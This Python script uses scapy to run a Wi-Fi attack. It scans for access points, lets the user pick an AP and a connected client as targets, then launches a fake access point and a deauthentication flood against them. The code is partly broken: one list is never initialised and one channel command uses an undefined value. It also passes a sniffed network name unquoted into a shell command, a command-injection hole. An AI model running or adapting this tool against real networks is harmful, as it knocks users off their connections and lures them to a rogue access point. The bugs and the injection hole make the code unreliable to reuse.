import os
import sys
from threading import *
import logging
from paramiko import channel
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

global search_timeout
global interface
global ap_mac
global ap_name
global ap_channel
global client_mac
global client_list

ESSID = 0
BSSID = 1
CHANNEL = 2
ap_list = []
essids_set = set()

def monitorMode(a):
    os.system("ifconfig " + a + " down")
    os.system("iwconfig " + a + " mode monitor")
    os.system("ifconfig " + a + " up")


### For scaning multiple APs need to check each channel in the range [1,14].
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


def ap_scan_pkt(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        essid = pkt[Dot11Elt].info.decode()
        if essid not in essids_set:
            essids_set.add(essid)
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get("channel")
            ap_list.append([essid, bssid, channel])

def client_scan_pkt(pkt):
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client with MAC address: " + pkt.addr1 + " was found.")

if __name__ == "__main__":

    empty = input("Press Enter to start ")
    os.system('ifconfig')
    interface = input("Enter interface name to put in monitor mode ")
    monitorMode(interface)

# ////////////////////////// step 2
    while(True):
        search_timeout = int(input( "Please enter number of seconds you want to scan AP's: "))
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        print("\n Scanning........\n")
        sniff(iface=interface, prn=ap_scan_pkt, timeout=search_timeout)
        num_of_ap = len(ap_list)
        if num_of_ap > 0:
            print("\n *** AP's *** \n")
            for x in range(num_of_ap):
                print("[" + str(x) + "] BSSID: " + ap_list[x][BSSID] + "  Channel:" + str(ap_list[x][CHANNEL])
                      + "  AP name: " + ap_list[x][ESSID])
            ap_index = int(input("Choose AP's number to attack:"))
            print("Attack : [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(
            ap_list[ap_index][CHANNEL]) + "  name: " + ap_list[ap_index][ESSID])
            os.system('iwconfig %s channel %d' % (interface, (int(ap_list[ap_index][CHANNEL]))))
            os.system('iwconfig %s channel %d' % (interface, channel))
            ap_mac = ap_list[ap_index][BSSID]
            ap_name = ap_list[ap_index][ESSID]
            ap_channel = ap_list[ap_index][CHANNEL]
            break
        else:
            rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
            if rescan == "n":
                sys.exit(0)
    # ////////////////////////// step 3
    while(True):
        s_timeout = search_timeout * 2
        print( "\nScanning for clients that connected to: " + ap_name + " ...")
        sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
        num_of_client = len(client_list)
        if num_of_client > 0:
            print("\n***Clients Table ***\n")
            for x in range(num_of_client):
                print("[" + str(x) + "] - " + client_list[x])

            client_index = input("Choose client's number you want to attack:")
            if client_index.isnumeric():
                print("You choose the client: [" + client_index + "] - " + client_list[int(client_index)])
                client_mac = client_list[int(client_index)]
                break
        else:
            rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
            if rescan == "n":
                sys.exit(0)

    print("'Ctrl+C' to stop sending the packets. \n")
    empty = input (" Enter to start sending the Deauthentication packets.")
    os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
    os.system('python3 Deauthentication.py ' + client_mac + ' ' + ap_mac + ' ' + interface)